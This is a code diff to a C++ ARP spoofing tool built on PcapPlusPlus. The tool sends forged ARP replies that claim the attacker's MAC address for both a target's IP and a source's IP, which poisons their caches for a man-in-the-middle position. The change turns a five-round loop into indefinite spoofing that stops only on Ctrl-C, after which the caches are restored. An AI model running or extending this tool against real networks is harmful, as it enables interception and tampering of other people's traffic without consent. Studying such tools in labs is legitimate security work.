@@ -9,14 +9,21 @@
 #include "PcapLiveDevice.h"
 #include "PcapLiveDeviceList.h"
 #include "SystemUtils.h"
+#include <csignal>
 #include <cstdlib>
 #include <getopt.h>
 #include <iostream>
 #include <unistd.h>
 
+static volatile sig_atomic_t g_shutdown_requested = 0;
+
 void create_arp_packet() { pcpp::Packet arpRequest(500); }
 
 
+void handle_signal(int signum) {
+    std::cout << "Send " << signum <<std::endl;
+    g_shutdown_requested = 1;
+}
 
 void restoreARP(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
                 pcpp::MacAddress &mac_src, pcpp::IPv4Address &ipv4_target,
@@ -74,10 +81,7 @@ void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
   sourceARPReply.addLayer(&sourceARPLayer);
   sourceARPLayer.computeCalculateFields();
   
-
-  int max = 5 ;
-  int min = 0;
-  while (min < max) {
+  while (!g_shutdown_requested) {
     pDevice->sendPacket(&targetARPReply);
     std::cout << "Sent ARP reply: " << ipv4_target
               << " [target] is at MAC address " << mac_src << " [me]"
@@ -87,7 +91,6 @@ void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
               << " [source] is at MAC address " << mac_src << " [me]"
               << std::endl;
     std::this_thread::sleep_for(std::chrono::seconds(5));
-    min++;
   }
   restoreARP(pDevice, ipv4_src, mac_src, ipv4_target, mac_target);
   
@@ -168,5 +171,14 @@ int main(int argc, char **argv) {
     std::cout << "Cannot open interface" << std::endl;
     exit(1);
   }
+
+  struct sigaction sa;
+  sa.sa_handler = handle_signal;
+
+  if (sigaction(SIGINT, &sa, nullptr) == -1) {
+        std::perror("sigaction(SIGINT) failed");
+        return 1;
+    }
+
   arpspoofing(pIfaceDevice, IPv4_source, MAC_source, IPv4_target, MAC_target);
 }
